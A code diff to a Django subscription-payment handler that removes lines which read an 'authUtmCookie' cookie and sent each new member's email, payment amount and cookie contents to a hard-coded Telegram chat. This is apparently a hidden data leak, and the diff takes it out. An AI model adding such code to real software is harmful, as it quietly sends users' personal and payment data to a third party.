@@ -6,7 +6,6 @@ from django_q.tasks import async_task
 
 from notifications.email.invites import send_invited_email, send_invite_confirmation, send_invite_renewed_email
 from notifications.email.users import send_registration_email, send_renewal_email
-from notifications.telegram.common import Chat, send_telegram_message
 from users.models.user import User
 from payments.models import Payment
 
@@ -15,7 +14,7 @@ log = logging.getLogger(__name__)
 IS_TEST_STRIPE = settings.STRIPE_API_KEY.startswith("sk_test")
 
 
-def club_subscription_activator(product, payment, user, request):
+def club_subscription_activator(product, payment, user):
     now = datetime.utcnow()
     if user.membership_expires_at < now:
         user.membership_expires_at = now  # ignore days in the past
@@ -30,14 +29,6 @@ def club_subscription_activator(product, payment, user, request):
     # notify the user
     if user.moderation_status == User.MODERATION_STATUS_INTRO:
         async_task(send_registration_email, user)
-        cookie_auth = request.COOKIES['authUtmCookie']
-        if cookie_auth:
-            pay = Payment.objects.filter(user_id=user.id, status='success').last()
-            text_send = user.email + ' ' + str(pay.amount) + "\n" + cookie_auth.replace('/', "\n")
-            send_telegram_message(
-                chat=Chat(id=204349098),
-                text=text_send
-            )
     else:
         async_task(send_renewal_email, user)
 
